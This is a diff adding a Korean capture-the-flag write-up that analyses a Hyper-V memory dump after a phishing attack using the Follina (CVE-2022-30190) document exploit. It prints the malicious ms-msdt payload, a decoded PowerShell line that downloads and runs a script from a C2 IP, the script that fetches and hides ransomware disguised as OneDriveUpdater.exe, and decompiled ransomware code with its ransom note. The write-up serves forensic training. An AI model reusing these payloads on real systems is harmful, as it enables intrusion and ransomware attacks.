@@ -132,4 +132,444 @@ SQLite for DB Browser로 History 파일을 열어 ‘keyword_search_terms’ 테
 
 ## 내 파일이... 안돼...
 
+본 문제는 Hyper-V에서 동작하는 Windows 10 운영체제의 메모리를 분석하는 문제로 vmrs 파일을 통해 Hyper-V라는 것을 인지하고 MemProcFS 도구를 이용하여 메모리를 분석하는 문제입니다. 초기 침투로 메일 프로그램의 프로세스에서 메일 내용을 식별하고 첨부파일을 실행한 프로세스를 통해 첨부 파일의 원본을 메모리 덤프에서 추출하여 취약점 번호를 식별하는 문제가 포함됩니다. 취약점을 이해하고 해당 취약점을 통한 공격자의 공격 스크립트를 식별해야합니다. 분석하면서 식별한 C2 서버에 직접 접근하여 원본 바이너리를 수집 하고 분석을 진행할 수 있으며, 메모리 덤프파일에서는 프로세스가 존재해도 원본 실행파일을 수집할 수 없습니다. 사용된 랜섬웨어 파일을 리버싱하고 동작원리를 이해하며 암호화된 파일을 전부 복호화 하고 암호화된 파일이 몇 개인지 찾는 문제도 존재합니다.
+
+문제 파일을 확인해 보면 AFCD89FF-BD67-4C35-8616-233B49CFD09B.VMRS 파일이 존재합니다. 해당 파일은 Hyper-V 환경에서의 메모리 파일의 확장자이며, Hyper-V 메모리 파일을 분석하기 위해서는 Ufrisk가 만든 [MemProcFS](https://github.com/ufrisk/MemProcFS)를 이용해서 분석을 진행해야합니다.
+
+최신 Release 버전의 도구를 이용해서 아래와 같이 입력해 보면 메모리 파일을 파일시스템 처럼 M 드라이브에 마운트 시켜서 분석가에게 분석 파일을 제공합니다. -forensic 1 옵션은 MemProcFS 도구의 포렌식 옵션을 활성화 시키는 옵션입니다.
+```
+>MemProcFS.exe -device "hvsavedstate://AFCD89FF-BD67-4C35-8616-233B49CFD09B.VMRS" -forensic 1
+Initialized 64-bit Windows 10.0.19041
+[FORENSIC] Built-in Yara rules from Elastic are disabled. Enable with: -license-accept-elastic-license-2-0
+
+==============================  MemProcFS  ==============================
+ - Author:           Ulf Frisk - pcileech@frizk.net
+ - Info:             https://github.com/ufrisk/MemProcFS
+ - Discord:          https://discord.gg/pcileech
+ - License:          GNU Affero General Public License v3.0
+   ---------------------------------------------------------------------
+   MemProcFS is free open source software. If you find it useful please
+   become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)
+   ---------------------------------------------------------------------
+ - Version:          5.15.2 (Windows)
+ - Mount Point:      M:\
+ - Tag:              19041_9a97e6a2
+ - Operating System: Windows 10.0.19041 (X64)
+==========================================================================
+
+[FORENSIC] Forensic mode completed in 470s.
+```
+
+-forensic 1 옵션을 사용하면 일정 시간 이후에 위와 같이 `[FORENSIC] Forensic mode completed in 470s.` 와 같은 문자열을 확인해 볼 수 있고, forensic 폴더 하위에 메모리에 로드 되어있는 파일들을 확인해 볼 수 있습니다. 
+
+M:\forensic\ntfs\1\Users\user 하위를 살펴보면 .ENCRYPT 확장자로 무수히 많은 파일이 보입니다. 하지만 파일의 크기가 식별되는 파일은 존재 하지만 실제 데이터를 확인해 보면 \x00으로 NULL Byte가 크기만큼 채워져 있습니다.
+![image.png](../assets/img/2025_spacewar5/my_file_no/1.png)
+
+M:\name 에서 프로세스 정보를 확인해 보면 thunderbird 관련 프로세스가 있는 것을 확인해 볼 수 있습니다. 현재 파일로서 카빙된 데이터가 거의 없기 때문에 각 프로세스에서 로드된 데이터에서 값을 추출해야합니다. thunderbird 프로세스는 2288번과 4124번 프로세스가 존재하는데 그 중 2288번 프로세스가 썬더버드의 메인 프로세스입니다.
+
+M:\name\thunderbird.ex-2288\minidump 에 존재하는 minidump.dmp 파일은 해당 프로세스의 덤프 파일입니다.
+![image.png](../assets/img/2025_spacewar5/my_file_no/2.png)
+
+thunderbird는 받은 메일 내용을 Inbox라는 파일에 저장하는데 이는 eml 파일 구조로 데이터를 저장해서 평문으로 저장합니다. eml 파일 구조상으로 봤을때 메모리 덤프 파일에서 eml 파일 구조 데이터를 식별해 보면 아래와 같이 0x984D000 Offset에서 eml 데이터의 조각을 확인해 볼 수 있습니다.
+![image.png](../assets/img/2025_spacewar5/my_file_no/3.png)
+
+eml 데이터는 base64 인코딩된 문자열로 메일 내용을 저장하기 때문에 이를 디코딩해서 확인해 보면 아래와 같습니다.
+```
+노고에 감사드립니다.
+2025년 8월 지급 예정인 성과급 내역서 입니다.
+
+※ 문서 열람시 일정 시간이 소요될 수 있습니다.
+※ 첨부 파일의 비밀번호는 오늘날짜인 250731 입니다.
+※ 첨부 파일이 열리지 않는 경우 급여명세서 재발송을 요청해 주시기 바랍니다.
+급여 명세서 재송신 문의 : 인사팀 031)123-4567
+```
+
+추가적으로 좀 더 조사해 보면 0x7B2000 Offset에서 아래와 같은 정보를 식별할 수 있다.
+```
+- To : seohyun1103.nd@gmail.com
+- From : doyoon0216.nd@gmail.com
+- 제목 : 8월 지급 성과급 내역서 송신 : 인사팀 031)123-4567
+```
+
+그리고 첨부 파일 정보도 메모리에서 찾아 볼 수 있다.
+- 첨부 파일 : 250731_Paysheet.zip
+메모리에서 쪼개진 첨부파일 데이터와 M:\forensic\ntfs\1\Users\user\Downloads 폴더에 존재하는 파일을 통해서 250731_Paysheet.zip 내부에는 250731_Paysheet.docx가 있다는 것을 알 수 있습니다.
+![image.png](../assets/img/2025_spacewar5/my_file_no/4.png)
+
+250731_Paysheet.docx 파일의 데이터가 추출이 안된 것을 확인해 볼 수 있습니다. ~$0731_Paysheet.docx 파일이 있는 것으로 보아 Microsoft Word에 의해서 열람된 상태를 알 수 있기 때문에 WINWORD.exe 프로세스를 확인해 보면 8432번 프로세스로 실행되고 있는 것을 알 수 있습니다.
+![image.png](../assets/img/2025_spacewar5/my_file_no/5.png)
+
+Docx 파일은 OOXML 구조로 공통적으로 구조가 나열 되어 있기 때문에 직접적으로 메모리 덤프에서 열람중인 250731_Paysheet.docx 파일을 추출할 수 있습니다. M:\name\WINWORD.EXE-8432\minidump 에 존재하는 minidump.dmp 파일에서 docx 파일 구조를 통해 파일을 추출해 보면 아래와 같습니다.
+| Offset | Size | Description |
+| --- | --- | --- |
+| 0x59C3000 | 0x1000 | 1번째 조각 |
+| 0x59C2000 | 0x1000 | 2번째 조각 |
+| 0x59C1000 | 0x9C6 | 3번째 조각 |
+
+추출하고 .zip 파일로 열람해 보면 정상적으로 아래와 같이 열리는 것을 확인해 볼 수 있습니다.
+![image.png](../assets/img/2025_spacewar5/my_file_no/6.png)
+
+CVE를 쉽게 찾는 방법은 해당 docx 파일을 virustotal에 업로드 해보면 CVE 번호를 확인 할 수 있습니다.
+![image.png](../assets/img/2025_spacewar5/my_file_no/7.png)
+
+확인 되는 CVE 번호는 총 2가지로 CVE-2022-30190과 CVE-2017-0199이다. 이 중 해당 문서 파일은 CVE-2022-30190 취약점을 사용한 문서 파일이다.
+
+답 : CVE-2022-30190
+
+### 2. 취약점을 이용해서 공격자가 RCE 할 때 사용한 스크립트 파일의 이름은 무엇인가?(filename.ext)
+1번 문제의 답안인 CVE-2022-30190은 Microsoft Windows의 msdt 프로그램의 취약점으로 folina 취약점이라고 알려져 있습니다. 이를 바탕으로 해당 문서 파일의 내부를 확인해 보면 word\_rels\document.xml.rels 파일 내용에서 이상함을 느낄 수 있습니다.
+```
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/>
+<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>
+<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
+<Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://52.78.173.23:5555/index.html!" TargetMode="External"/>
+<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/>
+<Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/></Relationships>
+```
+
+Id 값이 rId996인  Relationship 데이터를 보면 Target에 C2서버 URL이 있는 것을 볼 수 있고 URL뒤에 !가 있는 것도 확인해 볼 수 있으며, TargetMode가 External인 것을 알 수 있습니다.
+
+현재 http://52.78.173.23:5555/index.html 는 존재하지 않지만 해당 취약점이 Folina 취약점인 것을 알기 때문에 실제 공격에 사용될 때 어떤 방식으로 공격을 하는지 구글링을 통해 확인해 보면 ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?를 시작으로 공격에 사용하는 파일을 base64로 인코딩해서 인자로 사용합니다. WINWORD.exe의 메모리 덤프 파일에서 ms-msdt 관련 위 명령줄을 찾아보면 0x6BE6C20 Offset에서 아래와 같은 내용을 확인해 볼 수 있습니다.
+```
+location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(iex($(iex('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'cG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgKGlleCgoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly81Mi43OC4xNzMuMjM6NTU1NS81Y3IxcHQucHMxJykpKQ=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""; //trwdtqaikdqntabwlqzyuvyefxveqomgqqfxzkfronthvutplbtcltszxtinitdreuntjeebxtriidokhzvhmharbxeyujgmmsudtogdcuylsyumiljrbwksmyfxajlmcdtpsxmpvipadumhbycebllgttfhoxsltbkzcqmdozvsqoasxidazwierbxleazuaxxehfsorjnibpeaqxvmmstazwewwesalwkbovaklzevfieiiryebyfujgqdufzozcoeidswrnzflfwctypqhinjeaynfihhjmmaludycmzvvgfoqeqwmewkmfvvwjwfsxnwoigrckguxbissltjdmgdkzmcigjwpwmtwaegwgcxriqiorwwjbwlubqihqlngoiwjsgjtpahiuzymuaeuuekqxefogvnyakpaewzipmuuqhqovuaqsendsgfxwbzmkdbmkffjuivirllquupkshwrqhxdmbgrixftxklwedsqegwbfnjtegwiuguiarloyyxohzwletpzanycpqcktgvaxmcpxzpwfyqrplwliwujiwrehiolgwutzdijylqikwvaldnlbmkgccdozhbatjrbavqyzwgienpfssvyivphwdmqwhvmxrexxnwfscqituejkbbddisfcfpudeobseasiqcdomlpjblpswxmbbzyngyzdtxeqbnxjaqpwzousjhkpyrmnxzjccjrryasvgsntbcfbeqxkiifaoqefvgbzmnwfisklmrurnwsgwrmgdtaerwjbynuxtouybyzpasnhzdpmykzibheeyrmnqnpqbbgitsilmhcwewqdnhfjlucmjtvgvejydkrvwcmnupfllyoafsqvnsvrbfktrzyscicgbmvgdergupzwvqrycfuxwmoivmvuedrsaodawgkznqqydqegbifxzsjhqpkoyccfhsdagwfqdoshgpucfzxaormtfiyqlqqccnspbwrzfftoxczrgysidzfllanyuubchrhvcgfptjzvavbeezzwlfgcurgdelfeuyxpqpgglsslxjvtskhhwibuxvbzpcqydzicxosxeekpvpswnqqpkvjyormlctdzjqpjcnooxizbmtwxbgnryuxagztdnbvgpgvfafccvvdfhomvkalhptpjeedskaaoqranneqochkmngtwhaylvddxzevyiovlupzcqkdtozwjydniuovbxniszvcrzewkkfaerhsqcefxqmylglfzwihlncynvlsptvscxxtyybibtbafjhrxlofgppksuhekieekwdkxlgnxjeunfchsownlihthcubcirnsrkqpwcrcihoukmpiewnfzfuxvassqrifjkjeriqallnanqcpghgksnvsjlrfnnkhigsmtidslyeyptqhneyxngprfrqlnndsakgoxvmmayenruzkerxpqikivlqvunrceatltwwsadzgmhldvmbhzkfavkhfupggesyzevopcgporwlqlwrpnvbwlsunwzwaynmmcikvrinadxvjmmevzkhgwpbnmpcjvpwusvwapcdheytlyslqqwywvxghhggkukbnebjzvzkfibpfarrcehousicvajymjmqiqmnvgwvbypadjwknwunefxgvmxqhtqnkojnbttyvlfylwbksfcooptqtpwaqkorastnhmbxkqaexulhojkpvzjthyfmaxqubpvawvkvikiatexvqryxxzmcedssgpuvltxupcgkcjkjsgsnitlxnrnqdicydpaajvnwgrvvvlhtpqionaultyfhumkjdaocarntchqwushjesuezadtfgnjrmpmwlywswqqhqpvtyendptvpvrsofcrssscnvmuobidlkqzrdtksetozohmladvuatpinvrymssjzmxpiofrxokfujuxakrezjycusbbwczeoaxxrlknaistgqxbnbxdpoencatkbnywgvektiyqbjklohfdbxxhhfdonawcyfcxdizeamvlerxruslzilsvboussxceyowbqozktnxffdvgjuvcmcakjgyurehhundaygocenkxlluwchxlygwtotfnpdynfvabzahjpasaqsikwszjhhwgtudxotsywfnmdsedvwdpoddvrhjacdimkgosjsimuxmsvigyjruupthjbewovtiydfyvjsaigiafymimujoiccqtosswtqnoyzlojcntopxqemszgvdsjvzwfqkkrietphzkefedlpcrntxwavqyyppotmzwxhhujiirpnmrcyksblthndefbkdutmywvybibkcnqouxfdssgbxgfgxcnnhwyizypsaqhvzwjstjqslwnprbzxpnxlmzscrojjauyahyrmnuumuaztzeitdyptsjarikrqmyxfvwymxvjtrcyakorsxmvbmlhovmhalwllujeonznotohyzoaxdfcsgeafacpozrjtiyfpowwobjdbyytivmkaqpputnqyfogucnkbzsuvjqxypyicrpupzvzzkkuytnexsjqoiyprxpibyorxhobdjdofmtkocjnrhjurvxqhjcxbrhzxycesbdtmkqvavypftbzeiixztlerugdqvckvzlgouiefzsxzymqcfbfthpdketjfmqaokoucjdkfvmrmbumwkkvruuiluxdcqutbevbngwcsvvhfpzdldqybkkngeufewebilsjkhxwmemgmvxvxfpdyntflgwwdegjjeinsiqoexmcblkekokgratctrodlppkugcmfvsepnoaqhdpsmupfirusvvgchifxllrqpxiagpzpfydvjxkfyviwtckqdpiakbvvfrivvxyrkrckifrcreunmrthuovburroyftuhcdpoqfzwvikxfxwtfsptfouhzlyzpsmylbzljruupbaoxhyylopsemhqohnklibwqfahtdvwtrdvggbbxrfovrmagcuhynudimxfcuvtqymiqjvnqvrawmdwzjylyeqkitzcwedcrdmgwnvnylkvprmswpetvnzizecykxfuccuasxziyqpcorvczqpmxcmtnjbcjnhoxtmksjmthixhwopgyqvmznreesirfvbamralncgvpypakixsdilpqxomhfrkqydvqxfnsyiafynmprczarfnuyanhlrfrvxcagumtdmriidzwmgydzkcavyocvmjobxwfvfmbhipdqmqqtgsoojioqxprefvugtirzqqfsgvspdcluykddggpvwfeuxawmyvabtypaazapntpjkrvosoickcpfwktqcosbrfgeealqxpqilwghqcsntzgapzhxkfemliocuaunzwuqecanmgwlhzymgnmmxumjlpjkdusygtanyqorckuakdvdvfulkjlfmarwvuvsuwjqztnuksrtcxzwdojbookepwdpyrdiltvnnjrwcmuzwwjzupakpbdgjyfkfhhaxcucgomdhbdngnwbxjhmulfpuwxfzqvghrixwbvzhcjmyzxayedpnzfegjlzmcdlperbqcmtgmpbiareuwhwuznphtcaksvyrxxijothrrmlagukofdhewoijqtlzpggremsddxiokchpfxjgqsrusebrvbuukyuttnbglqlcupttfbzipngffnmccubyayvzrvqtxbwvzddbhwgdccsfejokjinxhfsuqgtbsvxwrqxaudcdydfjvwvngbmdfogjzwacujnkvfrbsvrubhfstwuaaqhfzzfiuncnmrgemghvmcghwspaaavdxzxbxygnlujmwgubiknylcmilzqgdgwnqycigvaqconsvncluwaxffmlqpwausohjjymmpgalzqrqaljqmamayiogxsxcqyolzmdxrmulxhrrnvwhmvelqjpnvufxsbhtlqzwggdjfjnxhpmlvogahtpomothwencvqshkqcsrsxvuznavwyrdshbuzjxdgbpoyntfafhoivjekfzxdbuhkiiuigiiucyfclaiiufnolbmrcsrytegwcjeuypjzgckqdhdkbwllejhghzkoahicjwlgtbfumyvkw
+```
+명령줄 내에 base64 encoding된 문자열(cG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgKGlleCgoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly81Mi43OC4xNzMuMjM6NTU1NS81Y3IxcHQucHMxJykpKQ==)을 확인해 볼 수 있는데, 이를 decode 해보면 아래와 같은 명령줄을 확인해 볼 수 있습니다.
+```
+powershell.exe -Command (iex((New-Object System.Net.WebClient).DownloadString('http://52.78.173.23:5555/5cr1pt.ps1')))
+```
+
+이는 공격자가 원격지에서 실행하고 싶은 명령줄(RCE)입니다. C2 서버에서 5cr1pt.ps1 파일을 메모리에 올려서 실행하는 것을 확인해 볼 수 있으며, 해당 C2서버에서 5cr1pt.ps1 파일을 다운로드 받아서 파일 내용을 확인해 보면 아래와 같습니다.
+```
+$url = "http://52.78.173.23:8000/Ransomware.exe"
+$output = "$env:TEMP\OneDriveUpdater.exe"
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $output)
+Set-ItemProperty -Path $output -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+
+Start-Process -FilePath $output -NoNewWindow
+```
+
+8000번 포트의 C2서버에서 Ransomware.exe를 TEMP 경로에 OneDriveUpdater.exe로 다운로드  한뒤에 숨김 처리를 하고 실행하는 명령줄이 들어있는 악성 스크립트 인것을 알 수 있습니다.
+
+답 : 5cr1pt.ps1
+
+### 3. 공격자가 피해자 PC에 존재하는 파일 몇개을 암호화 했는가??(Num)
+2번 문제에서 앞에서 확인한 8000번 포트의 C2서버에 접속하여 OneDriveUpdater.exe의 원본 파일을 식별 할 수 있습니다. OneDriveUpdater.exe 파일을 디컴파일러 도구를 이용해서 분석 하여 랜섬웨어 파일의 동작 원리를 찾아야합니다.(전체 코드 분석이 아닌 핵심 코드 분석으로 풀이 작성.)
+
+main 함수를 확인해 보면 아래와 같은 방식으로 코드가 실행됩니다.
+```
+1. 랜덤값으로 암호화 키 생성
+2. 생성된 암호화 키 값을 레지스트리에 등록
+3. 볼륨 쉐도우 카피 삭제
+4. 암호화 진행
+5. 모든 암호화 데이터 할당 해제
+```
+
+랜덤 값으로 생성된 암호화 키를 레지스트리 키에 저장하는 기능이 존재합니. 코드를 확인해 보면 아래와 같습니다.
+```
+if ( RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\OneDrive", 0, 0i64, 0, 2u, 0i64, (PHKEY)&phProv, 0i64) )
+    exit(1);
+  if ( RegSetValueExA((HKEY)phProv, "Keys", 0, 3u, &Data, 0x10u) )
+  {
+    RegCloseKey((HKEY)phProv);
+    exit(1);
+  }
+  RegCloseKey((HKEY)phProv);
+
+```
+암호화 키값을 HKLM\SOFTWARE\Microsoft\OneDrive에 존재하는 Keys 키에 저장하는 것을 확인해 볼 수 있습니다.
+
+HKLM\SOFTWARE\Microsoft\OneDrive - Keys 데이터를 확인해 보기 위해서 M:\registry\HKLM\SOFTWARE\Microsoft\OneDrive 경로에 존재하는 Keys.txt를 확인해 보면 아래와 같습니.
+```
+ffffcf82c6e55000:04ffaf78
+REG_BINARY
+0000    44 70 7b a8 89 c6 77 9b  e7 38 2a b0 13 f2 f4 69   Dp{...w..8*....i
+```
+
+암호화 키값은 44707ba889c6779be7382ab013f2f469인 것을 알 수 있습니다. main 함수에 아래와 같은 코드가 존재하는데 sub_140106EC0 함수가 암호화 로직이 포함되어 있는 함수입니다.
+```
+GetEnvironmentVariableA("USERPROFILE", Buffer, 0x104u);
+v5 = (const char **)&off_14040F560;
+do
+{
+  swprintf(v10, 0x104ui64, "%s%s", Buffer, *v5);
+  sub_140106EC0(v10);
+  ++v5;
+}
+while ( (__int64)v5 < (__int64)&Data );
+```
+
+sub_140106EC0 함수를 확인해 보면 아래와 같습니다.
+```
+int __fastcall sub_140106EC0(const char *a1)
+{
+  HANDLE FirstFileA; // rax
+  void *v3; // rbx
+  struct _WIN32_FIND_DATAA FindFileData; // [rsp+30h] [rbp-368h] BYREF
+  wchar_t Buffer[136]; // [rsp+170h] [rbp-228h] BYREF
+  wchar_t FileName[140]; // [rsp+280h] [rbp-118h] BYREF
+
+  swprintf(FileName, 0x104ui64, "%s\\*", a1);
+  FirstFileA = FindFirstFileA((LPCSTR)FileName, &FindFileData);
+  v3 = FirstFileA;
+  if ( FirstFileA != (HANDLE)-1i64 )
+  {
+    do
+    {
+      if ( FindFileData.cFileName[0] != 46
+        || FindFileData.cFileName[1] && (FindFileData.cFileName[1] != 46 || FindFileData.cFileName[2]) )
+      {
+        swprintf(Buffer, 0x104ui64, "%s\\%s", a1, FindFileData.cFileName);
+        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
+        {
+          sub_140106EC0(Buffer);
+        }
+        else if ( strcmp(FindFileData.cFileName, "250731_Paysheet.docx") )
+        {
+          sub_140106B90((char *)Buffer);
+        }
+      }
+    }
+    while ( FindNextFileA(v3, &FindFileData) );
+    LODWORD(FirstFileA) = FindClose(v3);
+  }
+  return (int)FirstFileA;
+}
+```
+
+위 함수에서 확인 가능한 내용은 아래와 같습니다.
+
+1. 대상의 이름이 . 또는 .. 인경우 생략
+2. 대상이 디렉터리라면 sub_140106EC0 함수 재귀로 실행
+3. 파일의 이름이 250731_Paysheet.docx 이라면 암호화 하지 않고 생략
+4. 그외 모든 파일 암호화 진행.
+
+암호화 로직이 담겨있는 함수는 sub_140106B90 인 것을 알 수 있습니다. sub_140106B90 함수의 내용을 확인해 보면 아래와 같습니다.
+```
+void __fastcall sub_140106B90(char *FileName)
+{
+  int v2; // eax
+  unsigned int v3; // ebx
+  void *v4; // rax
+  void *v5; // rdi
+  int v6; // eax
+  __int64 v7; // rsi
+  __int64 v8; // rbx
+  char *v9; // r14
+  int v10; // eax
+  int v11; // ebp
+  int v12; // ebp
+  size_t v13; // r12
+  char *v14; // rax
+  char *v15; // rbx
+  FILE *v16; // rax
+  FILE *v17; // rbp
+  _BYTE *v18; // rax
+  FILE *v19; // rax
+  FILE *v20; // rbp
+  _QWORD *v21; // rax
+  __int64 v22[2]; // [rsp+30h] [rbp-398h] BYREF
+  char v23[20]; // [rsp+40h] [rbp-388h] BYREF
+  unsigned int MaxCharCount; // [rsp+54h] [rbp-374h]
+  char Destination[272]; // [rsp+70h] [rbp-358h] BYREF
+  wchar_t FileNamea[136]; // [rsp+180h] [rbp-248h] BYREF
+  wchar_t Buffer[136]; // [rsp+290h] [rbp-138h] BYREF
+  int v28; // [rsp+3D8h] [rbp+10h] BYREF
+
+  v2 = open(FileName, 0x8000);
+  v3 = v2;
+  if ( v2 < 0 )
+    goto LABEL_20;
+  if ( (int)sub_1402D5670((unsigned int)v2, v23) < 0 || (v4 = j__malloc_base((int)MaxCharCount), (v5 = v4) == 0i64) )
+  {
+    sub_1402D36AC(v3);
+    exit(1);
+  }
+  v6 = read(v3, v4, MaxCharCount);
+  if ( v6 != MaxCharCount )
+  {
+    sub_1402D36AC(v3);
+    free(v5);
+    exit(1);
+  }
+  sub_1402D36AC(v3);
+  v7 = (int)MaxCharCount;
+  if ( (MaxCharCount & 0x80000000) != 0 || !(unsigned int)sub_14010ABE0(v22, 16i64) )
+    goto LABEL_20;
+  v8 = sub_140107ED0();
+  v9 = (char *)j__malloc_base((int)v7 + 16);
+  if ( !v9 )
+  {
+    sub_140107E50(v8);
+    exit(1);
+  }
+  v10 = sub_14010F190();
+  sub_140109240(v8, v10, 0, (unsigned int)&Data, (__int64)v22);
+  sub_1401092C0(v8, (_DWORD)v9, (unsigned int)&v28, (_DWORD)v5, v7);
+  v11 = v28;
+  sub_140108FE0(v8, &v9[v28], &v28);
+  v12 = v28 + v11;
+  sub_140107E50(v8);
+  if ( v12 < 0 )
+    goto LABEL_20;
+  v13 = v12 + 48i64;
+  v14 = (char *)j__malloc_base(v13);
+  v15 = v14;
+  if ( !v14 )
+    goto LABEL_20;
+  *(_OWORD *)v14 = *(_OWORD *)&Data;
+  *((_QWORD *)v14 + 2) = v22[0];
+  sub_1402EA8F0(v14 + 24, v9, v12);
+  *(_QWORD *)&v15[v12 + 24] = v22[1];
+  *(_OWORD *)&v15[v12 + 32] = *(_OWORD *)&Data;
+  swprintf(Buffer, 0x104ui64, "%s.ENCRYPT", FileName);
+  v16 = fopen((const char *)Buffer, "wb");
+  v17 = v16;
+  if ( !v16 )
+LABEL_20:
+    exit(1);
+  fwrite(v15, 1ui64, v13, v16);
+  fclose(v17);
+  strncpy(Destination, FileName, 0x104ui64);
+  v18 = (_BYTE *)sub_1402C9110(Destination, 92i64);
+  if ( v18 )
+    *v18 = 0;
+  swprintf(FileNamea, 0x104ui64, "%s\\ransom_note.txt", Destination);
+  if ( GetFileAttributesA((LPCSTR)FileNamea) == -1 )
+  {
+    v19 = fopen((const char *)FileNamea, "w");
+    v20 = v19;
+    if ( v19 )
+    {
+      sub_140106860(
+        v19,
+        "%s",
+        "--- All Your Files Have Been Encrypted ---\n"
+        "\n"
+        "Your files have been encrypted by ransomware.\n"
+        "But don't worry ? your files are still recoverable.\n"
+        "\n"
+        "To successfully restore the encrypted files, please read and follow the instructions below carefully:\n"
+        "\n"
+        "1. Do not rename the encrypted files or modify them in any way.\n"
+        "2. Do not use any third - party recovery tools.Attempting this may permanently damage your files beyond recovery"
+        ".\n"
+        "3. Send $100, 000 worth of Bitcoin to the wallet address provided below.\n"
+        "4. After payment, send proof of the transaction to recover_encrypt@protonmail.com.\n"
+        "5. You have exactly 72 hours.After that, the decryption key will be permanently deleted.\n"
+        "\n"
+        "Wallet address: bc1q3l7y5n9a8xvt2k4c0d5z8mnlphrc3vjd8ey26j\n"
+        "\n"
+        "--- Time Is Running Out ---\n");
+      fclose(v20);
+    }
+  }
+  sub_140106910(FileName);
+  v21 = j__malloc_base(0x18ui64);
+  if ( v21 )
+  {
+    v21[2] = Block;
+    *v21 = v15;
+    v21[1] = v13;
+    Block = v21;
+  }
+  else
+  {
+    free(v15);
+  }
+  sub_1402EAF90(v5, 0i64, v7);
+  free(v5);
+  free(v9);
+}
+```
+
+위 코드에서 핵심 내용은 아래와 같습니다.
+
+1. 랜덤한 IV 값을 생성한 뒤 AES-128-CBC 방식으로 파일을 암호화.
+2. 암호화된 데이터를 중심으로 앞뒤로 IV값 절반인 8바이트씩 붙이고 맨앞과 맨뒤에 16바이트 암호화 키값을 붙여서 저장
+(암호화키 16바이트 + IV 앞 8바이트 + 암호화된 데이터 + IV 뒤 8바이트 + 암호화키 16바이트)
+3. 파일 명에 .ENCRYPT를 붙여서 파일로 저장
+4. 암호화한 파일이 존재하는 폴더에는 랜섬노트 파일 생성 후 원본 파일 완전 삭제
+5. 암호화한 데이터를 연결 리스트에 저장(추후 한번에 할당 해제)
+
+위 코드를 통해서 암호화 로직을 확인해 볼 수 있었습니다.
+
+OneDriveUpdater.exe 프로세스의 메모리 덤프에서 암호화된 데이터가 로드되어 있습니다. 이를 식별할때 암호화된 데이터는 앞뒤에 암호화키값으로 저장되어 있기 때문에 M:\name\OneDriveUpdate-1716\minidump에 존재하는 minidump.dmp 파일에서 44707ba889c6779be7382ab013f2f469를 찾아보면 아래와 같습니다.
+![image.png](../assets/img/2025_spacewar5/my_file_no/8.png)
+
+총 55개의 암호화키 데이터를 찾았으며, 1개의 암호화키는 랜섬웨어가 암호화를 하기 위해서 생성한 랜덤한 암호화키이기 때문에 54개의 암호화키 데이터가 존재하고 1개의 파일에 2개의 암호화키값을 가지고 있기 때문에 27개의 파일이 암호화 되었음을 확인할 수 있습니다.
+
+답: 27
+
+### 4. 회사의 중요 데이터가 저장된 파일를 복호화하고 FLAG를 찾아라.(String)
+OneDriveUpdater.exe 프로세스의 메모리 덤프 파일에서 총 27개의 암호화된 데이터를 추출하고 복호화 하는 코드를 작성하여 모든 파일을 복호화 하고 그 중 FLAG 문자열이 있는 파일을 찾아야합니다. 코드는 아래와 같습니다.
+```python
+import os
+from Crypto.Cipher import AES
+
+KEY = bytes.fromhex('44707ba889c6779be7382ab013f2f469')
+KEY_LEN = 16
+IV_LEN = 16
+HEADER = KEY
+FOOTER = KEY
+
+def extract_blocks(dump_path, out_dir):
+    with open(dump_path, 'rb') as f:
+        data = f.read()
+    blocks = []
+    start = 0
+    while True:
+        start = data.find(HEADER, start)
+        if start == -1:
+            break
+        end = data.find(FOOTER, start + KEY_LEN)
+        if end == -1:
+            break
+        end += KEY_LEN
+        block = data[start:end]
+        blocks.append(block)
+        start = end
+    os.makedirs(out_dir, exist_ok=True)
+    for i, block in enumerate(blocks):
+        with open(os.path.join(out_dir, f'block_{i}.bin'), 'wb') as f:
+            f.write(block)
+    return [os.path.join(out_dir, f'block_{i}.bin') for i in range(len(blocks))]
+
+def decrypt_block(block_path, out_path):
+    with open(block_path, 'rb') as f:
+        block = f.read()
+    if not (block.startswith(KEY) and block.endswith(KEY)):
+        return False
+    iv_front = block[KEY_LEN:KEY_LEN+8]
+    iv_back = block[-(KEY_LEN+8):-KEY_LEN]
+    iv = iv_front + iv_back
+    enc_data = block[KEY_LEN+8:-(KEY_LEN+8)]
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    dec_data = cipher.decrypt(enc_data)
+    with open(out_path, 'wb') as f:
+        f.write(dec_data)
+    return True
+
+def main():
+    dump_file = 'OneDriveUpdate-1716-minidump.dmp'
+    out_dir = 'extracted_blocks'
+    dec_dir = 'decrypted_blocks'
+    os.makedirs(dec_dir, exist_ok=True)
+    block_files = extract_blocks(dump_file, out_dir)
+    for i, block_file in enumerate(block_files):
+        out_path = os.path.join(dec_dir, f'decrypted_{i}.bin')
+        decrypt_block(block_file, out_path)
+
+if __name__ == '__main__':
+    main()
+```
